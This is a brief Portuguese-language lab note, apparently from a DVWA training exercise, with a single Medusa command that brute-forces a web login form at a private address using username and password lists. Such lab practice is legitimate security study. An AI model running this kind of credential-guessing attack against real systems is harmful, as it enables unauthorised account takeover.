## Ataque ao Formulário Web (DVWA)
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m FORM:"login.php" -m DENY-SIGNAL:"error" -f -t 3
```
